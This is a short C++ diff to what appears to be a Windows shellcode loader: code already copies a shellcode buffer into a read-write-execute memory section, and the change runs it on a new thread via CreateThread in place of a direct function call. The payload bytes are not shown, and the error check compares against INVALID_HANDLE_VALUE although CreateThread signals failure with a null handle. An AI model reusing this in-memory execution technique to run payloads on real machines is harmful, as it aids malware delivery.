@@ -61,11 +61,22 @@ int main()
 	// Write the code to the section
 	CopyMemory(rwxSectionAddr, shellcodeRaw, sizeof(shellcodeRaw));
 
+	HANDLE hThread = nullptr;
 	DWORD threadID{};
-
-	// Run the shellcode
 	ShellcodeFunc func = (ShellcodeFunc)rwxSectionAddr;
-	func();
+
+	// Create the func as __stdcall convenvtion (CreateThread convention)
+	if ((hThread = CreateThread(nullptr, 0, (PTHREAD_START_ROUTINE)func, nullptr, 0, &threadID)) == INVALID_HANDLE_VALUE) {
+		std::cout << "Error executing CreateThread - " << GetLastError() << std::endl;
+		return 1;
+	}
+	
+	std::cout << "Thread ID: " << threadID << std::endl;
+
+	// Wait until response from return
+	WaitForSingleObject(hThread, INFINITE);
+
+	CloseHandle(hThread);
 
 	return 0;
 }
